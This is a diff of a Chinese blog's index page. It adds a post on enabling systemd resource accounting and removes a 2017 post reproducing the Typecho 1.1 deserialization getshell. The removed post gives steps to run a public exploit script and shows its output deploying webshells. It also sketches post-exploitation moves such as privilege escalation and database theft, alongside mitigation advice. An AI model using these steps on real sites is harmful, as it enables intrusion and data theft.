@@ -73,6 +73,73 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-systemd-accounting/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2018/04/06/systemd-accounting/index/" class="article-date">
+  <time class="dt-published" datetime="2018-04-06T00:00:00.000Z" itemprop="datePublished">2018-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/linux/">linux</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2018/04/06/systemd-accounting/index/">systemd - systemctl不显示内存CPU信息</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>刚刚发现树莓派上的Ubuntu Mate用systemctl status查看服务状态的时候不显示CPU和内存信息，而其他系统下都是显示的。</p>
+<p><img src="/images/201804061054053.png"></p>
+<p><img src="/images/2018040610540091.png"></p>
+<p> </p>
+<p>再来一个不显示的CentOS</p>
+<p><img src="/images/2018040610540888.png"></p>
+<p>后来通过<code>systemctl show</code>发现好像有个参数能设置，通过手册<code>man systemd-system.conf</code></p>
+<p>查看到配置文件中写了这么一段话：</p>
+<blockquote>
+<p>DefaultCPUAccounting&#x3D;, DefaultBlockIOAccounting&#x3D;, DefaultMemoryAccounting&#x3D;, DefaultTasksAccounting&#x3D;</p>
+<p>Configure the default resource accounting settings, as configured per-unit by CPUAccounting&#x3D;, BlockIOAccounting&#x3D;, MemoryAccounting&#x3D;</p>
+<p>and TasksAccounting&#x3D;. See systemd.resource-control(5) for details on the per-unit settings.</p>
+</blockquote>
+<p>啊那咱去改配置文件呗？</p>
+<p>sudo vim &#x2F;etc&#x2F;systemd&#x2F;system.conf</p>
+<p>找到这么几行，取消注释改成yes，然后重启下或者<code>systemctl daemon-reload</code>就好了啦。</p>
+<p>DefaultCPUAccounting&#x3D;yes<br>DefaultMemoryAccounting&#x3D;yes<br>DefaultTasksAccounting&#x3D;yes</p>
+<p>你看都出来了吧（不过为啥<code>TasksAccounting=yes</code>都是yes了还不显示tasks数目呢？</p>
+<p><img src="/images/2018040610541099.png"></p>
+<p><img src="/images/2018040610541286.png"></p>
+<hr>
+<p>但这都不是重点！重点是，</p>
+<p>谁来<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ServerSan">拯救我这个Python程序</a>？占用这么多内存，看样子应该是死锁了……</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018040610584428.jpg"><img src="/images/2018040610584428.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018040611030523.jpg"><img src="/images/2018040611030523.jpg"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2018/04/06/systemd-accounting/index/" data-id="clhp7rtkp009cs2qrg4vq9a59" data-title="systemd - systemctl不显示内存CPU信息" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-my-lovestory/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2018/03/10/my-lovestory/index/" class="article-date">
@@ -1269,103 +1336,6 @@ return e
 
 
   
-    <article id="post-typecho-exploit/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2017/10/31/typecho-exploit/index/" class="article-date">
-  <time class="dt-published" datetime="2017-10-31T00:00:00.000Z" itemprop="datePublished">2017-10-31</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/justsay/">justsay</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2017/10/31/typecho-exploit/index/">谈谈近期Typecho 的漏洞exploit及预防措施</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>几天前（28日好像是）Typecho被爆出getshell漏洞，想想还是很可怕的。 [v_error]噢对了，我忘记说了，本文仅供学习交流，请不要在未授权的环境中使用此工具。我图中的测试站，是我现搭建的(对就是不想告诉大家我究竟有多少个域名和服务器…)……你就看那个主机名，miss-ed，思念还是错过，多么符合我的文风啊！[&#x2F;v_error]</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务器环境</p>
-<blockquote>
-<p>nginx&#x2F;1.9.5</p>
-<p>PHP 7.0.22</p>
-<p>mysql Ver 14.14 Distrib 5.5.48</p>
-<p>Typecho 1.1 (17.4.24)（好像是1013还是10月28日之前的都有这个问题）</p>
-</blockquote>
-<p>有没有人想问为什么是Nginx 1.9.5这么老的版本吗……唔</p>
-<p><img src="/images/103117_0858_Typecho1.png"></p>
-<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/923164944278814721">真是没有比我还蠢的人了</a></p>
-<p>利用条件：PHP对webroot拥有写入权限，www的600就够了。如果Typecho对目录没有写权限，那么……没得玩了。</p>
-<p>小知识：很多人对Linux中文件目录权限（rwx）的理解可能是有一些偏差的，以下说明不包含root这个天神，root可以无视这三个基础权限的：</p>
-<p>对于文件来说，r代表着能够对文件进行读取；w代表着能够对文件内容进行更改（比如说删除一行，增加一行等等），但是w权限并不意味着能够删除文件；x意味着文件可以作为可执行程序，系统不会告诉你一个permission denied</p>
-<p>对于目录来说，r意味着能够对目录下的内容进行list，比如说ls test这就意味着你对test要至少有r才能执行ls；w意味着能够对目录下的文件进行删除、创建、重命名；x意味着能够进入该目录成为工作目录，也就是能够cd test</p>
-<p>可能有很多人以为，对文件有w权限就能删掉它了吧？不是的哦，是要对文件所在的目录有w权限才可以的。下面的图是一个简单的验证： <img src="/images/103117_0858_Typecho2.png"></p>
-<h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit'/]GitHub%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/Typecho\_deserialization\_exploit&#39;\]GitHub开源地址\[/gt\]</a></p>
-<p>git clone <a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit">https://github.com/BennyThink/Typecho\_deserialization\_exploit</a><br>cd Typecho_deserialization_exploit<br>python exp.ty</p>
-<p>之后根据提示操作，示例输出：</p>
-<blockquote>
-<p>root@qcloud:~&#x2F;Typecho_deserialization_exploit# python exp.py 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;1 Input your target, i.e:<a target="_blank" rel="noopener" href="http://localhost/ty">http://localhost/ty</a> &gt;<a href="https://example.com/">https://example.com</a> Your target url is <a href="https://example.com/">https://example.com</a> shell: <a href="https://example.com/p0.php">https://example.com/p0.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;2 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your PHP code: &gt;echo ‘pwned’; pwned 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;3 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your system commands: &gt;ls 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;4 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 visit <a href="https://example.com/b374k.php">https://example.com/b374k.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;</p>
-</blockquote>
-<p>成功写入webshell，第三步执行系统命令没有回显是因为我禁用了<code>system()</code>函数</p>
-<p><img src="/images/103117_0858_Typecho3.png"></p>
-<p><img src="/images/103117_0858_Typecho4.png"></p>
-<p>由于运行PHP的用户是一个低权限的non-login shell用户www，所以嘛……没有SMB那么爽的感觉了。当然Windows就没有这个说法了，说不定人品好，还有人是拿管理员运行的PHP呢……这个时候就可以有mimikatz了。</p>
-<h2 id="更进一步的玩法"><a href="#更进一步的玩法" class="headerlink" title="更进一步的玩法"></a>更进一步的玩法</h2><p>只是一点点猜想，仅供参考</p>
-<h3 id="内核提权漏洞"><a href="#内核提权漏洞" class="headerlink" title="内核提权漏洞"></a>内核提权漏洞</h3><p>通过<code>phpinfo</code>拿到系统信息，去exploit找对应的内核提权漏洞，想办法吧www提权成root</p>
-<h3 id="脱库与跑路"><a href="#脱库与跑路" class="headerlink" title="脱库与跑路"></a>脱库与跑路</h3><p>通过读取Typecho的配置文件<code>config.inc.php</code>拿到数据库账号密码，塞满垃圾文件，脱库与跑路什么的；顺着搜搜有没有MySQL的什么安全漏洞可以利用、绕过。</p>
-<h3 id="报告给博主"><a href="#报告给博主" class="headerlink" title="报告给博主"></a>报告给博主</h3><p>对，这才是正经的嘛……当然了，那些连个联系方式也不留的、八百年不发一篇博文的、whois查不到邮箱的、评论也不管的死灰一样的博客，那活该了。我也很无奈啊。</p>
-<h2 id="预防措施和一些建议"><a href="#预防措施和一些建议" class="headerlink" title="预防措施和一些建议"></a>预防措施和一些建议</h2><h3 id="升级Typecho到最新的版本或者删除文件"><a href="#升级Typecho到最新的版本或者删除文件" class="headerlink" title="升级Typecho到最新的版本或者删除文件"></a>升级Typecho到最新的版本或者删除文件</h3><p>升级Typecho到最新版本，或者删除<code>install.php</code>和<code>install</code>目录。暂时不能更新的，关站保平安吧。</p>
-<h3 id="使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL"><a href="#使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL" class="headerlink" title="使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL"></a>使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL</h3><p>千万不要拿root跑啊，这要是拿root跑了，那就和SMB漏洞是一样一样滴爽。</p>
-<h3 id="记得更新系统，不要使用已无支持的操作系统"><a href="#记得更新系统，不要使用已无支持的操作系统" class="headerlink" title="记得更新系统，不要使用已无支持的操作系统"></a>记得更新系统，不要使用已无支持的操作系统</h3><p>EOL（End of Life）的就不要用了，没有安全更新，万一被人找到提权，那不就完蛋了吗。</p>
-<p>举例说明，Windows XP，Windows 2003，Windows Vista，CentOS 5,Ubuntu 12.04等等……</p>
-<p>对于发行版来说，可以用cron来计划更新，比如说我是这么干的：</p>
-<p>0 3 *&#x2F;3 * * apt update &amp;&amp; apt upgrade -y</p>
-<p>每隔三天的凌晨三点都会更新一波</p>
-<h3 id="尽可能的使用Linux当服务器"><a href="#尽可能的使用Linux当服务器" class="headerlink" title="尽可能的使用Linux当服务器"></a>尽可能的使用Linux当服务器</h3><p>嗯……如果你用Windows的话，在这种情况下webshell就可以大显神通了……</p>
-<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>配置<code>open_basedir</code>,不让PHP程序访问本身目录以外的目录，比如说我是这么配置的：</p>
-<p>open_basedir&#x3D;&#x2F;home&#x2F;wwwroot&#x2F;dmesg.app:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;</p>
-<p>并且如果不需要的话，那么就禁用一些比较危险的函数，比如说<code>system()</code>、<code>exec()</code></p>
-<h3 id="别没事干就777"><a href="#别没事干就777" class="headerlink" title="别没事干就777"></a>别没事干就777</h3><p>除非你懂得777是什么意思，知道你这次的777有何影响。</p>
-<p>别说777了，任何更改文件目录（包括web目录）权限的操作都要三思而后行，尤其是某些特别敏感的文件，比如说如果某人的<code>/etc/shadow</code>的权限是644（原本应该是640），那么任何人都可以读取了……</p>
-<p>小提示：Linux下默认文件目录权限是怎么回事</p>
-<p>Linux下有一个东西叫做<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Umask">umask</a>，一般发行版都会是0022，我们只看后三位022，0意味着不拿掉任何权限，2代表拿掉2写权限。</p>
-<p>所以对于目录来说，最高权限是rwxrwxrwx（777），那么同组和其他人拿掉写权限，也就是rwxr-xr-xr，换成数字就是755啦；</p>
-<p>而文件呢，要比目录再少一个x权限，也就是再<strong>拿掉x</strong>，那么文件就是rw-r–r–也就是644了。为啥要把文件拿掉x可执行权限啊？可执行太危险了呗。</p>
-<p>请一定要注意，<strong>不要做减法</strong>（7-2&#x3D;5）！！这样在umask已经拿掉x权限时（umask值包含1，3，5）会出错的。比如说如果umask是011，那么做减法，目录是766（rwx-rw-rw），文件是655（rw-r-xr-x），文件已经拿掉了x，怎么又出现了x呢？？是吧。正确的应该是目录rwx-rw-rw（766），文件拿掉x变为rw-rw-rw（666）</p>
-<h3 id="开启App-Armor、SELinux等"><a href="#开启App-Armor、SELinux等" class="headerlink" title="开启App Armor、SELinux等"></a>开启App Armor、SELinux等</h3><p>不好意思，这个我不太会玩……不过……很多人拿到一台CentOS都是……第一步……关闭SELinux的吧……</p>
-<h2 id="更多参考资料"><a href="#更多参考资料" class="headerlink" title="更多参考资料"></a>更多参考资料</h2><p><a target="_blank" rel="noopener" href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/">ph0rse</a> <a target="_blank" rel="noopener" href="https://joyqi.com/typecho/about-typecho-20171027.html">joyqi</a> <a target="_blank" rel="noopener" href="http://www.blogsir.com.cn/safe/454.html">blogsir</a> <a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">b374k</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次漏洞的影响还是比较大的，至少吧……攻击者能够拿到webshell，再怎么也能拿到整个数据库的权限了。</p>
-<p>哦对，trick or treat?</p>
-<blockquote>
-<p>賢狼ホロ：?羡慕高产（</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/10/31/typecho-exploit/index/" data-id="clhp7rtmj00aas2qr5aaxhk60" data-title="谈谈近期Typecho 的漏洞exploit及预防措施" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1423,6 +1393,10 @@ return e
       <ul>
         
           <li>
+            <a href="/2024/10/12/aca-php/index/">用 Azure Container Apps 运行PHP网站</a>
+          </li>
+        
+          <li>
             <a href="/2024/10/06/aca-vm-scale/index/">Azure Container Apps 连接到虚拟机并配置CPU自动缩放</a>
           </li>
         
@@ -1436,10 +1410,6 @@ return e
         
           <li>
             <a href="/2024/09/21/one-api-clickhouse/index/">one-api/new-api性能优化：使用 ClickHouse 作为日志系统</a>
-          </li>
-        
-          <li>
-            <a href="/2024/08/03/stripe-fraud/index/">Stripe 如何安全收款并避免盗刷与测卡</a>
           </li>
         
       </ul>
